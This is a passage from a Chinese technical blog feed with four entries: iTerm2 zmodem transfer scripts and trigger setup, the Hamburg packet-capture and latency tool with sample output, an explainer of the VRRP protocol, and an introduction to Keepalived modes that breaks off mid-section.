脚本（内容如下），并设置可执行权限：<code>chmod +x iterm2-send-zmodem.sh</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span><br><span class="hljs-comment"># shellcheck shell=dash  </span><br><span class="hljs-comment"># Author: Matt Mastracci (matthew@mastracci.com)  </span><br><span class="hljs-comment"># AppleScript from http://stackoverflow.com/questions/4309087/cancel-button-on-osascript-in-a-bash-script  </span><br><span class="hljs-comment"># licensed under cc-wiki with attribution required   </span><br><span class="hljs-comment"># Remainder of script public domain  </span><br>  <br>osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to version&#x27;</span> &gt; /dev/null 2&gt;&amp;1 &amp;&amp; NAME=iTerm2 || NAME=iTerm  <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NAME</span>&quot;</span> = <span class="hljs-string">&quot;iTerm&quot;</span> ]; <span class="hljs-keyword">then</span>  <br>    FILE=$(osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm&quot; to activate&#x27;</span> -e <span class="hljs-string">&#x27;tell application &quot;iTerm&quot; to set thefile to choose file with prompt &quot;Choose a file to send&quot;&#x27;</span> -e <span class="hljs-string">&quot;do shell script ( \&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot; )&quot;</span>)  <br><span class="hljs-keyword">else</span>  <br>    FILE=$(osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to activate&#x27;</span> -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to set thefile to choose file with prompt &quot;Choose a file to send&quot;&#x27;</span> -e <span class="hljs-string">&quot;do shell script ( \&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot; )&quot;</span>)  <br><span class="hljs-keyword">fi</span>  <br>  <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ]; <span class="hljs-keyword">then</span>  <br>    <span class="hljs-built_in">echo</span> Cancelled.  <br>    <span class="hljs-comment"># Send ZModem cancel  </span><br>    <span class="hljs-built_in">echo</span> \\x18\\x18\\x18\\x18\\x18  <br>    <span class="hljs-built_in">sleep</span> 1  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span> \# Cancelled transfer  <br><span class="hljs-keyword">else</span>  <br>    /usr/local/bin/sz <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> --escape --binary --bufsize 4096  <br>    <span class="hljs-built_in">sleep</span> 1  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;# Received <span class="hljs-variable">$FILE</span>&quot;</span>  <br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><ul><li>在 <code>/usr/local/bin</code> 目录中新增<code>iterm2-recv-zmodem.sh</code> 脚本（内容如下），并设置可执行权限：<code>chmod +x iterm2-recv-zmodem.sh</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span><br><span class="hljs-comment"># shellcheck shell=dash  </span><br><span class="hljs-comment"># Author: Matt Mastracci (matthew@mastracci.com)  </span><br><span class="hljs-comment"># AppleScript from http://stackoverflow.com/questions/4309087/cancel-button-on-osascript-in-a-bash-script  </span><br><span class="hljs-comment"># licensed under cc-wiki with attribution required   </span><br><span class="hljs-comment"># Remainder of script public domain  </span><br>  <br>osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to version&#x27;</span> &gt; /dev/null 2&gt;&amp;1 &amp;&amp; NAME=iTerm2 || NAME=iTerm  <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NAME</span>&quot;</span> = <span class="hljs-string">&quot;iTerm&quot;</span> ]; <span class="hljs-keyword">then</span>  <br>    FILE=$(osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm&quot; to activate&#x27;</span> -e <span class="hljs-string">&#x27;tell application &quot;iTerm&quot; to set thefile to choose folder with prompt &quot;Choose a folder to place received files in&quot;&#x27;</span> -e <span class="hljs-string">&quot;do shell script (\&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot;)&quot;</span>)  <br><span class="hljs-keyword">else</span>  <br>    FILE=$(osascript -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to activate&#x27;</span> -e <span class="hljs-string">&#x27;tell application &quot;iTerm2&quot; to set thefile to choose folder with prompt &quot;Choose a folder to place received files in&quot;&#x27;</span> -e <span class="hljs-string">&quot;do shell script (\&quot;echo \&quot;&amp;(quoted form of POSIX path of thefile as Unicode text)&amp;\&quot;\&quot;)&quot;</span>)  <br><span class="hljs-keyword">fi</span>  <br>  <br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ]; <span class="hljs-keyword">then</span>  <br>    <span class="hljs-built_in">echo</span> Cancelled.  <br>    <span class="hljs-comment"># Send ZModem cancel  </span><br>    <span class="hljs-built_in">echo</span> \\x18\\x18\\x18\\x18\\x18  <br>    <span class="hljs-built_in">sleep</span> 1  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span> \# Cancelled transfer  <br><span class="hljs-keyword">else</span>  <br>    <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> || <span class="hljs-built_in">exit</span>  <br>    /usr/local/bin/rz --rename --escape --binary --bufsize 4096   <br>    <span class="hljs-built_in">sleep</span> 1  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span>  <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;# Sent -&gt; <span class="hljs-variable">$FILE</span>&quot;</span>  <br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><ul><li>打开iTerm2软件，按照如下步骤配置 Triggers：<ul><li>打开 <code>Preferences...</code>；</li><li>选择 <code>Profiles</code> 标签页，并在左侧选择对应的 <code>Profile Name</code>；</li><li>点击右侧的 <code>Advanced</code> 标签页；</li><li>点击 <code>Triggers</code> 栏目下的 <code>Edit</code> 按钮，新增触发器，具体配置如下所示；</li></ul></li></ul><table><thead><tr><th align="center"><strong>Regular Expression</strong></th><th align="center"><strong>Action</strong></th><th align="center"><strong>Parameters</strong></th><th align="center"><strong>Instant</strong></th></tr></thead><tbody><tr><td align="center">rz waiting to receive.\*\*B0100</td><td align="center">Run Silent Coprocess…</td><td align="center">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;iterm2-send-zmodem.sh</td><td align="center">checked</td></tr><tr><td align="center">\*\*B00000000000000</td><td align="center">Run Silent Coprocess…</td><td align="center">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;iterm2-recv-zmodem.sh</td><td align="center">checked</td></tr></tbody></table><h2 id="三、实现逻辑"><a href="#三、实现逻辑" class="headerlink" title="三、实现逻辑"></a>三、实现逻辑</h2><ul><li>发送文件到终端的当前路径的实现逻辑：</li></ul><p><img src="/assets/images/iterm2-rz.png" alt="rz" loading="lazy"></p><ul><li>从终端下载文件到本地的实现逻辑：</li></ul><p><img src="/assets/images/iterm2-sz.png" alt="sz" loading="lazy"></p><h2 id="四、相关知识点"><a href="#四、相关知识点" class="headerlink" title="四、相关知识点"></a>四、相关知识点</h2><ul><li><a href="https://ss64.com/osx/osascript.html">osascript</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> iTerm2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hamburg - 抓包/耗时分析工具</title>
      <link href="/2020/07/27/hamburg/"/>
      <url>/2020/07/27/hamburg/</url>
      
        <content type="html"><![CDATA[<p><code>Hamburg</code>是一款用<code>Go</code>实现的抓包&#x2F;耗时分析的工具，项目地址为 <a href="https://github.com/bugwz/hamburg">https://github.com/bugwz/hamburg</a>。该工具的设计思想以及实现逻辑基本参照<a href="https://github.com/git-hulk/tcpkit">tcpkit</a>。</p><h2 id="一、功能实现"><a href="#一、功能实现" class="headerlink" title="一、功能实现"></a>一、功能实现</h2><ul><li><code>抓包/拆包</code>：使用 <a href="https://github.com/google/gopacket">gopacket</a> 进行抓包以及<code>IP</code>&#x2F;<code>TCP</code>&#x2F;<code>UDP</code>等信息的解析；</li><li><code>耗时分析</code>：通过监听端口以及与本地监听网卡的IP地址比对，猜测数据包的请求方向（Request&#x2F;Response），并临时保存Request的数据包，在接收到与之匹配的回复数据包后，就可以计算出整个请求在本机的处理耗时。由于只要有一个回复数据包，整个请求回复链路的耗时统计就算完成，因此在server对于pipline的请求会批次回复的情况（redis等）下，耗时统计可能会偏小；</li><li><code>Lua自定义脚本</code>：通过使用<a href="github.com/yuin/gopher-lua">gopher-lua</a>包，支持使用自定义lua处理数据包；</li><li><code>应用层数据解析</code>：目前支持按照<code>raw</code>&#x2F;<code>dns</code>&#x2F;<code>http</code>&#x2F;<code>redis</code>&#x2F;<code>memcached</code>&#x2F;<code>mysql</code>等协议的数据解析。在收到多个<code>Request数据包</code>并且还没有相应的<code>Response数据包</code>的情况下会自动合并解析后的请求内容。<ul><li><strong>raw</strong>：仅输出<code>SequenceID</code>，<code>ACKNumber</code>，<code>PayloadLen</code>以及数据包的Flags（包含<code>FIN</code>&#x2F;<code>SYN</code>&#x2F;<code>RST</code>&#x2F;<code>PSH</code>&#x2F;<code>ACK</code>&#x2F;<code>URG</code>&#x2F;<code>ECE</code>&#x2F;<code>CWR</code>）等信息；</li><li><strong>dns</strong>：支持解析多种请求的类型，包含<code>A</code>&#x2F;<code>NS</code>&#x2F;<code>MD</code>&#x2F;<code>MF</code>&#x2F;<code>CNAME</code>&#x2F;<code>SOA</code>&#x2F;<code>MB</code>&#x2F;<code>MG</code>&#x2F;<code>MR</code>&#x2F;<code>NULL</code>&#x2F;<code>WKS</code>&#x2F;<code>PTR</code>&#x2F;<code>HINFO</code>&#x2F;<code>MINFO</code>&#x2F;<code>MX</code>&#x2F;<code>TXT</code>&#x2F;<code>AAAA</code>，而响应数据包支持的解析类型较少，目前仅有<code>A</code>和<code>CNAME</code>；</li><li><strong>http</strong>：支持所有类型的数据解析，不过输出的信息仅有<code>Method Type</code>，<code>Host</code>，<code>Resource Path</code>和<code>Response Code</code>；</li><li><strong>redis</strong>：支持大多数的请求访问类型，不统计noreply请求耗时，在pipline的场景下对于<code>multi bulk</code>的指令解析比tcpkit更准确；</li><li><strong>memcached</strong>：不统计noreply请求耗时；</li><li><strong>mysql</strong>：仅支持了部分client对server的请求的数据包的解析，对于server回复给client的数据包暂时没有做解析处理；</li></ul></li></ul><h2 id="二、示例"><a href="#二、示例" class="headerlink" title="二、示例"></a>二、示例</h2><h3 id="2-1、解析dns数据包"><a href="#2-1、解析dns数据包" class="headerlink" title="2.1、解析dns数据包"></a>2.1、解析dns数据包</h3><p>监听本地网卡<code>en0</code>，过滤包含IP为<code>192.168.1.101</code>和端口<code>53</code>的数据包，按照<code>dns</code>的解析规则解析payload，输出请求回复链路耗时<code>大于0ms</code>的信心，并打印回复数据包的内容；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ go run main.go -i en0 -s 192.168.1.101 -p 53 -m dns -t 0 -a<br><br>Name:  en0<br>Description:<br>Devices addresses:<br>- IP address: 192.168.1.101<br>- Subnet mask:  ffffff00<br><br>Start capturing packet with filter: ((port <span class="hljs-number">53</span>) and ((host192.<span class="hljs-number">168.1</span>.<span class="hljs-number">101</span>)))<br>2020-07-26 11:17:30 ||  192.168.1.101:45742 =&gt;       223.5.5.5:53    || 155µs || [AAAA] manshs1.tsdmain.org ||<br>2020-07-26 11:17:30 ||  192.168.1.101:25138 =&gt;       223.5.5.5:53    || 162µs || [A] manshs1.tsdmain.org || [A] 215.33.36.57;<br>2020-07-26 11:17:30 ||  192.168.1.101:25138 =&gt;  208.67.220.220:53    || 584µs || [A] manshs1.tsdmain.com || [A] 225.42.15.55;<br>2020-07-26 11:17:33 ||  192.168.1.101:53488 =&gt;  208.67.220.220:53    || 575µs || [A] www.a.shifen.com || [A] 61.135.169.125/61.135.169.125;<br></code></pre></td></tr></table></figure><h3 id="2-2、解析redis数据包"><a href="#2-2、解析redis数据包" class="headerlink" title="2.2、解析redis数据包"></a>2.2、解析redis数据包</h3><p>监听本地网卡<code>en0</code>，过滤包含IP为<code>192.168.1.101</code>和端口<code>6379</code>的数据包，按照<code>redis</code>的解析规则解析payload，输出请求回复链路耗时<code>大于0ms</code>的信心；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">$ go run main.go -i en0 -s 192.168.1.101 -p 6379 -m redis -t 0<br><br>Name:  en0<br>Description:<br>Devices addresses:<br>- IP address: 192.168.1.101<br>- Subnet mask:  ffffff00<br><br>Start capturing packet with filter: ((port <span class="hljs-number">6379</span>) and ((host <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span>)))<br>2020-07-26 14:33:55 ||   192.168.1.203:55241 =&gt;   192.168.1.101:50396 || 408µs || COMMAND<br>2020-07-26 14:33:57 ||   192.168.1.203:55241 =&gt;   192.168.1.101:50396 || 191µs || info<br>2020-07-26 14:34:05 ||   192.168.1.203:55242 =&gt;   192.168.1.101:50396 || 193µs || info memory<br>2020-07-26 14:34:19 ||   192.168.1.203:54311 =&gt;   192.168.1.101:50396 || 312µs || <span class="hljs-built_in">set</span> a 1000<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 抓包 </tag>
            
            <tag> GitHub </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keepalived的高可用基石 - VRRP协议</title>
      <link href="/2020/06/20/keepalived-vrrp/"/>
      <url>/2020/06/20/keepalived-vrrp/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>路由实现了不同子网之间的数据通信，目前比较常用的路由配置方法大概分为两种：<code>动态路由</code>（利用RIP、OSPF进行动态学习）和<code>静态路由</code>（对终端设备静态配置路由）。动态路由可以通过学习的方式获取路由表，避免了静态路由需要手动配置以及后续变更的繁琐，但同时需要额外的占用线路带宽和CPU的处理时间。VRRP技术是在静态路由上用于在目标机器不可达之后的路由能够自动变更的一种实现手段。</p><h2 id="二、VRRP"><a href="#二、VRRP" class="headerlink" title="二、VRRP"></a>二、VRRP</h2><h3 id="2-1、简介"><a href="#2-1、简介" class="headerlink" title="2.1、简介"></a>2.1、简介</h3><p>VRRP(Virtual Router Redundancy Protocol)，即虚拟路由冗余协议，它是为了避免路由器出现单点故障的一种容错协议。VRRP协议的实现有<code>VRRPv2</code>和<code>VRRPv3</code>两个版本，<code>VRRPv2</code>基于<code>IPv4</code>，<code>VRRPv3</code>基于<code>IPv6</code>。相关RFC文件为：<a href="https://tools.ietf.org/html/rfc2338">RFC2338 - Virtual Router Redundancy Protocol</a>, <a href="https://tools.ietf.org/html/rfc3768">RFC3768 - Virtual Router Redundancy Protocol (VRRP)</a>, <a href="https://tools.ietf.org/html/rfc5798">RFC5798 - Virtual Router Redundancy Protocol (VRRP) Version 3 for IPv4 and IPv6</a>。</p><h3 id="2-2、基础概念"><a href="#2-2、基础概念" class="headerlink" title="2.2、基础概念"></a>2.2、基础概念</h3><ul><li><code>VIP</code>：Virtual IP, 即虚拟IP，是一个不与特定计算机或网络接口卡(NIC)相连的IP地址；</li><li><code>VRRP路由器</code>：运行VRRP协议的路由器（或设备），它可能属于一个或多个虚拟路由器；</li><li><code>Master路由器</code>：承担转发报文任务的VRRP设备；</li><li><code>Backup路由器</code>：一组没有担转发任务的VRRP设备，当Master设备出现故障时，它们将通过竞选成为新的Master设备；</li><li><code>虚拟路由器</code>：由一组<code>VRRP路由器</code>组成，抽象成一个虚拟的路由器。它拥有一个<code>虚拟路由器标识符（VRID）</code>和一个（或多个）<code>VIP</code>；</li><li><code>虚拟MAC地址</code>：即虚拟路由器根据VRID生成的MAC地址，一个虚拟路由器拥有一个虚拟MAC地址，当虚拟路由器回应ARP请求时，回复虚拟MAC地址，而不是接口的真实MAC地址，格式为：<code>00-00-5E-00-01-{VRID}(VRRP for IPv4)</code>，<code>00-00-5E-00-02-{VRID}(VRRP for IPv6)</code>，<strong>从VRID的用途可以看出VRID的取值范围是0～255</strong>；</li><li><code>IP地址拥有者（IP Address Owner）</code>：如果一个<code>VRRP路由器</code>将<code>VIP</code>作为真实的接口地址，则该设备是IP地址拥有者，当这台设备正常工作时，它会响应<code>目的地址</code>是VIP的报文，如ping、TCP连接等；</li><li><code>优先级（Priority）</code>：用来标识虚拟路由器中各成员路由器的优先级，<code>虚拟路由器</code>根据优先级选举出<code>Master</code>和<code>Backup</code>；</li></ul><h3 id="2-3、报文"><a href="#2-3、报文" class="headerlink" title="2.3、报文"></a>2.3、报文</h3><p>VRRP协议报文用来将<code>Master设备</code>的<code>优先级</code>和<code>状态</code>通告给同一备份组的所有<code>Backup设备</code>。VRRP协议报文封装在IP报文中，发送到分配给VRRP的IP组播地址。</p><ul><li>IP报文头中，源地址为发送报文接口的主IP地址（不是虚拟IP地址），目的地址是224.0.0.18，TTL是255，协议号是112；</li><li>IP报文头中，TTL必须为255，当VRRP路由器收到TTL不等于255的VRRP协议报文后，必须丢弃；</li></ul><h4 id="2-3-1、VRRPv2报文"><a href="#2-3-1、VRRPv2报文" class="headerlink" title="2.3.1、VRRPv2报文"></a>2.3.1、VRRPv2报文</h4><ul><li>仅适用于IPv4网络；</li><li>为了兼容早期版本（RFC2338），VRRPv2版本保留报文的认证字段，但是VRRP认证并不能提高安全性；</li><li>秒级的通告报文的发送时间间隔；</li></ul><p><img src="/assets/images/vrrpv2.png" alt="VRRPv2" loading="lazy"></p><h4 id="2-3-2、VRRPv3报文"><a href="#2-3-2、VRRPv3报文" class="headerlink" title="2.3.2、VRRPv3报文"></a>2.3.2、VRRPv3报文</h4><ul><li>适用于IPv4和IPv6两种网络；</li><li>不支持认证功能；</li><li>厘秒级（100分之1秒）的通告报文的发送时间间隔；</li></ul><p><img src="/assets/images/vrrpv3.png" alt="VRRPv3" loading="lazy"></p><h4 id="2-3-3、报文字段含义"><a href="#2-3-3、报文字段含义" class="headerlink" title="2.3.3、报文字段含义"></a>2.3.3、报文字段含义</h4><ul><li><code>Version</code>：长度<strong>4比特</strong>，指VRRP协议版本，VRRPv2此字段为2，VRRPv3此字段为3；</li><li><code>Type</code>：长度<strong>4比特</strong>，定义了VRRP报文的类型，本版本的协议仅定义了一个报文类型：<ul><li><code>1</code>：Advertisement 带有未知类型的报文必须被丢弃；</li></ul></li><li><code>Virtual Rtr ID8</code>：长度<strong>8比特</strong>，虚拟路由器标识（VRID）字段标识了此报文所报告状态的虚拟路由器。可配置的范围是1–255。没有缺省值；</li><li><code>Priority</code>：长度<strong>8比特</strong>，申明了发送此报文的VRRP路由器的优先级。值越高优先级越高。如果VRRP路由器是虚拟路由器地址的IP地址所有者，那么其优先级必须为255。备用作用的VRRP路由器的优先级必须在1–254之间。缺省的VRRP路由器优先级为100。优先级值0 用于指示当前虚拟路由器的主路由器停止参与VRRP组。主要用于触发备用路由器快速地迁移到主路由器，而不用等待当前主路由器超时；</li><li><code>Count IP Addrs</code>：长度<strong>8比特</strong>。在此VRRP通告中包含的IP地址的数量；</li><li><code>Auth Type</code>：长度<strong>8比特</strong>，用于标识要用到的认证方法。在一个虚拟路由器组内认证类型是唯一的。如果报文携带未知的认证类型或者该认证类型和本地配置的认证方法不匹配，那么该报文必须被丢弃。目前定义的认证方法有：<ul><li><code>0(No Authentication)</code> : 表明VRRP协议报文的交换不需要认证。在发送VRRP协议报文时，<code>Authentication Data</code> 字段将被置为<code>0</code>，而在接收协议报文时，<code>Authentication Data</code> 字段被忽略；</li><li><code>1(Simple Text Password)</code>: 表示明文认证方式。</li><li><code>2(IP Authentication Header)</code>：表示MD5认证方式；</li></ul></li><li><code>Adver Int</code>：长度<strong>8比特</strong>，VRRP通告间隔时间，单位为秒（默认为1秒），这个字段主要用于错误配置路由器时的故障定位和解决；</li><li><code>Checksum</code>：长度<strong>16比特</strong>，16位校验和，用于检测VRRP报文中的数据破坏情况；</li><li><code>IP Address</code>：长度<strong>32比特</strong>，VRRP备份组的虚拟IPv4地址或者虚拟IPv6地址；</li><li><code>Authentication Data</code>：长度<strong>32比特</strong>，VRRP报文的认证字，目前只有明文认证和MD5认证才用到该部分，对于其它认证方式，一律填0；</li></ul><h3 id="2-4、工作原理"><a href="#2-4、工作原理" class="headerlink" title="2.4、工作原理"></a>2.4、工作原理</h3><h4 id="2-4-1、状态机"><a href="#2-4-1、状态机" class="headerlink" title="2.4.1、状态机"></a>2.4.1、状态机</h4><ul><li><code>初始状态(Initialize)</code>：该状态下VRRP处于<code>不可用</code>的状态，在此状态下设备不会对VRRP报文做任何处理，通常刚配置VRRP时或设备检测到故障时会进入该状态。收到接口startup（启动）的状态，如果设备的优先级为<code>255</code>（表示该设备为虚拟路由器IP地址拥有者），则直接成为Master设备。如果设备的优先级小于255，则会先切换到<code>Backup状态</code>。</li><li><code>活动状态(Master)</code>：处于该状态下的设备为Master设备，Master设备会做如下工作：<ul><li>定时发送VRRP通告报文，时间间隔为<code>Advertisement_Interval</code>；</li><li>以虚拟MAC地址相应对虚拟IP地址的ARP请求；</li><li>转发目的MAC地址为虚拟MAC地址的IP报文；</li><li>抢占模式下，如果收到比自己优先级大的VRRP报文，或者跟自己优先级相等，且本地接口IP地址小于源端接口IP地址时，则转变为Backup状态；</li><li>收到Shutdown(关闭)消息后，则立即转变为<code>初始状态(Initialize)</code>；</li></ul></li><li><code>备份状态(Backup)</code>：处于该状态下的设备接收Master发送的VRRP通告报文，判断Master是否正常。如果一定时间间隔没有收到VRRP通告报文，即<code>Master_Down_Interval（Master_Down_Interval = 3 * Advertisement_Interval + Skew_time</code> 超时，则判断为Master故障。<ul><li>接收Master发送的<code>VRRP通告报文</code>，判断Master是否正常；</li><li>对虚拟IP的ARP请求不做响应；</li><li>丢弃目的MAC地址为虚拟路由器MAC地址的IP报文；</li><li>丢弃目的IP地址为虚拟路由器IP地址的IP报文；</li><li>如果收到优先级比自己高，或与自己相等的VRRP报文，则重置<code>Master_Down_Interval定时器</code>（不进一步比较IP地址）；</li><li>如果收到优先级比自己小的VPPR报文，且优先级为0时，（表示原Master设备声明不参与该VRRP组了），定时器时间设置为Skew_time（偏移时间，<code>Skew_time= (256 - priority)/256）</code>；</li><li>如果收到优先级比自己小的VPPR报文，且优先级不为0时，丢弃该报文，立即转变为Master状态；</li><li><code>Master_Down_Interval定时器</code>超时，立即转变为Master状态；</li><li>收到Shutdown（关闭）消息后，则立即转变为<code>初始状态(Initialize)</code>；</li></ul></li></ul><h2 id="三、参考地址"><a href="#三、参考地址" class="headerlink" title="三、参考地址"></a>三、参考地址</h2><ul><li><a href="https://www.cnblogs.com/clsn/p/8052649.html">https://www.cnblogs.com/clsn/p/8052649.html</a></li><li><a href="https://cshihong.github.io/2017/12/18/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE-VRRP/">https://cshihong.github.io/2017/12/18/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE-VRRP/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Keepalived </tag>
            
            <tag> VRRP </tag>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Keepalived的学习与使用</title>
      <link href="/2020/06/16/keepalived/"/>
      <url>/2020/06/16/keepalived/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="https://www.keepalived.org/">Keepalived</a> 软件起初是专为LVS负载均衡软件设计的，用来监控管理LVS集群系统中各个服务节点的状态，后来又加入了可以解决静态路由单点故障问题从而实现高可用的<a href="https://wikipedia.org/wiki/Virtual_Router_Redundancy_Protocol">VRRP</a>功能。因此，<a href="https://www.keepalived.org/">Keepalived</a> 除了能够管理LVS软件外，还可以作为其他服务（例如<a href="https://nginx.org/en/">Nginx</a>、<a href="http://www.haproxy.org/">Haproxy</a>、<a href="https://www.mysql.com/">MySQL</a>等）的高可用解决方案软件。</p><h3 id="1-1、安装部署"><a href="#1-1、安装部署" class="headerlink" title="1.1、安装部署"></a>1.1、安装部署</h3><p>通过<a href="https://www.keepalived.org/download.html">官网下载</a> 或者 <a href="https://github.com/acassen/keepalived">GitHub</a> 下载源码进行编译安装，由于<a href="https://www.keepalived.org/">Keepalived</a> 使用了<a href="https://packages.debian.org/sid/libpopt-dev">libpopt库</a>用来解析命令行参数，因此我们也需要安装<code>libpopt</code>库。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装libpopt</span><br>yum install popt-devel<br><br><span class="hljs-comment"># 进入keepalived源码目录编译安装</span><br>./configure<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><h3 id="1-2、配置"><a href="#1-2、配置" class="headerlink" title="1.2、配置"></a>1.2、配置</h3><p>针对版本 <a href="https://github.com/acassen/keepalived/releases/tag/v2.1.2">2.1.2</a>，配置大致分为如下几大类：</p><ul><li><code>global_defs</code> : 主要是配置故障发生时的通知对象以及机器标识；</li><li><code>vrrp_instance</code> : 用来定义对外提供服务的VIP区域及其相关属性；</li><li><code>virtual_server</code> : 虚拟服务器，来源<code>vrrp_instance</code>中配置的虚拟IP地址，后面加空格加端口号；</li></ul><p>详细配置可参考源码中的 <code>./doc/samples/*.conf</code> 等配置文件，关于配置文件的各参数的详细解析可以参考 <a href="https://www.keepalived.org/manpage.html">官方文档</a></p><h3 id="1-3、组件介绍"><a href="#1-3、组件介绍" class="headerlink" title="1.3、组件介绍"></a>1.3、组件介绍</h3><ul><li><code>core</code>：keepalived的核心组件，负责主进程的启动和维护，全局配置文件的加载解析等；</li><li><code>check</code>：负责healthchecker(健康检查)，包括了各种健康检查方式，以及对应的配置的解析包括LVS的配置解析；</li><li><code>vrrp</code>：VRRPD子进程，VRRPD子进程就是来实现VRRP协议的；</li><li><code>libipfwc</code>：iptables(ipchains)库，配置LVS会用到；</li><li><code>libipvs*</code>：配置LVS会用到（keepalived和LVS完全是两码事，只不过他们各负其责相互配合而已）；</li></ul><h2 id="二、工作模式"><a href="#二、工作模式" class="headerlink" title="二、工作模式"></a>二、工作模式</h2><h3 id="2-1、双主模式-抢占模式"><a href="#2-1、双主模式-抢占模式" class="headerlink" title="2.1、双主模式(抢占模式)"></a>2.1、双主模式(抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数都为<code>MASTER</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数的大小决定实际的主备；<ul><li>参数值不同：参数值较大的为主，从而进行抢占；</li><li>参数值相同：后启动的为主，从而进行抢占；</li></ul></li></ul><h3 id="2-2、主备模式-抢占模式"><a href="#2-2、主备模式-抢占模式" class="headerlink" title="2.2、主备模式(抢占模式)"></a>2.2、主备模式(抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数配置为<code>MASTER</code>和<code>BACKUP</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数与<code>state</code>值共同决定实际的主备；<ul><li>该参数值不同：参数值较大的为主，从而进行抢占；</li><li>该参数值相同：<code>state</code>参数为<code>MASTER</code>的为实际的主，从而进行抢占；</li></ul></li></ul><h3 id="2-3、双备模式-抢占-非抢占模式"><a href="#2-3、双备模式-抢占-非抢占模式" class="headerlink" title="2.3、双备模式(抢占&#x2F;非抢占模式)"></a>2.3、双备模式(抢占&#x2F;非抢占模式)</h3><p>配置以及实际的主备说明：</p><ul><li><code>state</code> : 该参数配置为<code>BACKUP</code>；</li><li><code>priority</code> : 竞选优先级数值，该参数与<code>state</code>值共同决定实际的主备；<ul><li>该参数值不同: 参数值较大的为主，从而进行抢占；</li><li>该参数值相同: 先启动的为主，后启动的为备；</li></ul></li><li><code>nopreempt</code> : 是否启用非抢占模式，该参数只在双备模式下适用;<ul><li>开启: 新启动的永远是备，不进行抢占；</li><li>关闭: 主备关系依据其他逻辑判断，从而决定是否执行抢占；</li></ul></li></ul><h2 id="三、消息链路"><a href="#三、消息链路" class="headerlink" title="三、消息链路"></a>三、消息链路</h2><p>以下所说的主节点和备节点为实际的主备；</p><ul><li><code>心跳通知</code>: 主节点会不断地向备节点发送（多播的方式，默认的多播地址为<code>224.0.0.18</code>）心跳消息，用以告诉备节点自己还活着；</li><li><code>故障检测并接管资源</code>: 当主节点发生故障时，就无法发送心跳消息， 备节点无法继续检测到来自主节点的心跳，于是调用自身的接管程序，接管 原主节点的IP资源及服务;</li><li><code>故障恢复</code>：当原主节点的故障恢复后，依据配置决定是否抢占当前活跃节点的IP资源和服务；</li></ul><h2 id="四、脑裂Split-brain"><a href="#四、脑裂Split-brain" class="headerlink" title="四、脑裂Split-brain"></a>四、脑裂<a href="https://en.wikipedia.org/wiki/Split-brain">Split-brain</a></h2><h3 id="4-1、背景"><a href="#4-1、背景" class="headerlink" 